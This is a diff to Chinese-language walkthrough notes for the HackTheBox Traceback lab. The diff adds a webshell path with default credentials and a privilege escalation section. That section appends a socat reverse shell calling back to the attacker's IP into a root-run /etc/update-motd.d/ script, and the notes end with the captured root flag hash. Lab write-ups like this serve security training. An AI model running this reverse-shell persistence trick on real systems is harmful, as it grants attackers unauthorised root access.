@@ -1,5 +1,9 @@
 # HackTheBox-Traceback Notes
 
+> victim: 10.10.10.181
+>
+> local: 10.10.14.17
+
 ## 信息搜集
 
 ### SYN端口扫描结果
@@ -12,7 +16,7 @@ PORT   STATE SERVICE
 
 ## Webshell
 
-通过提示信息找到了webshell地址，用户名/密码admin
+通过提示信息找到了webshell地址`/smevk.php`，用户名/密码admin
 
 通过Socat升级到完全交互式shell
 
@@ -41,4 +45,33 @@ I'm sure you know where to find it.
 Contact me if you have any question.
 ```
 
-root提权以后再研究
+## Privilege Escalation
+
+LinEnum没有找到合适的结果
+
+在运行中的进程可以看到
+
+```
+/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+```
+
+发现`/etc/update-motd.d/`目录可写，且会利用root执行任务
+
+利用这个可以提权
+
+> Any code in that file will be run as the root account since the ssh-server service is run as root.
+
+执行命令
+
+```bash
+echo "/var/www/html/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.17:4444" >> 00-header
+```
+
+Kali开始监听，victim退出重登，成功获取root shell
+
+root.txt
+
+```
+82555710fefbfd8899f3117b9693badb
+```
+
